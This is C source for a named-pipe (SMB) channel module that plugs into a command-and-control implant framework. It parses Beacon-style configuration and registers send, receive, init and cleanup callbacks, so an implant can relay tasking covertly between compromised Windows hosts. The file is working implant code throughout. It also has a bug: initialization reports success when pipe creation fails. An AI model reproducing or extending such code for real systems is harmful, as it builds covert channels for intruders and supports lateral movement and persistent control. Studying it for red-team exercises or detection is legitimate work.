#include "channel.h"

#ifdef _DEBUG
#define DBG_PRINTF( x, ... ) dprintf( "[TCP CHANNEL]: " x, ##__VA_ARGS__ )
#else
#define DBG_PRINTF( x, ... )
#endif

BOOL SmbSend( CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Register ) {
    WriteFile( Context->PipeHandle, Data, Size, NULL, NULL );
    return TRUE;
}

BOOL SmbReceive( CHANNEL_CONTEXT* Context, CHAR** Data, DWORD* Size ) {
    DWORD bytesAvailable = 0;

    BOOL bResult = PeekNamedPipe( Context->PipeHandle, NULL, 0, NULL, &bytesAvailable, NULL );
    if (!bResult) {
        DWORD err = GetLastError();
        if (err == ERROR_BROKEN_PIPE) {
            DBG_PRINTF( "Server disconnected.\n" );
        } else {
            DBG_PRINTF( "PeekNamedPipe failed. Error: %lu\n", err );
        }
        return FALSE;
    }

    if (bytesAvailable > 0) {
        DBG_PRINTF( "Incoming message detected! Size: %lu bytes.\n", bytesAvailable );

        char* buffer =
            (char*)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, bytesAvailable + 1 );
        if (buffer == NULL) {
            DBG_PRINTF( "Memory allocation failed!\n" );
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (ReadFile( Context->PipeHandle, buffer, bytesAvailable, &bytesRead, NULL )) {
            buffer[bytesRead] = '\0';
        } else {
            DBG_PRINTF( "ReadFile failed.\n" );
        }

        *Data = buffer;
        *Size = bytesRead;
        return TRUE;
    }
    *Data = NULL;
    *Size = 0;
    return TRUE;
}

BOOL SmbInitialize( CHANNEL_CONTEXT* Context ) {
    HANDLE hPipe = CreateNamedPipeA(
        Context->Config.PipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,
        4096,
        4096,
        0,
        NULL );

    if (hPipe == INVALID_HANDLE_VALUE) {
        DBG_PRINTF( "Failed to create pipe.\n" );
        return 1;
    }

    ConnectNamedPipe( hPipe, NULL );

    Context->PipeHandle = hPipe;

    return TRUE;
}

BOOL SmbCleanup( CHANNEL_CONTEXT* Context ) {
    CloseHandle( Context->PipeHandle );
    RtlFreeHeap( GetProcessHeap(), 0, Context );
    return TRUE;
}

BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
    datap            Parser;
    CHANNEL_CONTEXT* Context = NULL;

    Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
    if (Context == NULL) {
        return FALSE;
    }

    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
    Context->Config.ID       = Implant->BeaconDataInt( &Parser );
    Context->Config.PipeName = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );

    Channel->ID          = Context->Config.ID;
    Channel->Initialize  = SmbInitialize;
    Channel->Send        = SmbSend;
    Channel->Receive     = SmbReceive;
    Channel->Cleanup     = SmbCleanup;
    Channel->Context     = Context;
    Channel->ContextSize = sizeof( CHANNEL_CONTEXT );

    return TRUE;
}
